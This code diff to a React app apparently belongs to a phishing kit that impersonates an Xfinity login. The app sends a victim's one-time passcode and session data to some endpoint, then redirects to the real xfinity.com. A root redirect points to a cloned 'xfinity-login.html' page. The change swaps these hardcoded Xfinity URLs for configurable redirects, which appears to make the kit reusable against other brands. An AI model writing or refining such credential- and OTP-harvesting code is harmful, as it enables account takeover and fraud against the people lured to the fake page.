@@ -62,7 +62,7 @@ function App() {
       data: { otp, session: loginFlowState.sessionData },
     });
 
-    window.location.href = 'https://www.xfinity.com';
+    window.location.href = config.redirects.afterOtp;
   };
 
   if (isLoading) {
@@ -115,7 +115,7 @@ function App() {
  */
 function RootRedirect() {
   useEffect(() => {
-    window.location.href = '/xfinity-login.html';
+    window.location.href = config.redirects.landingPage;
   }, []);
   return null;
 }
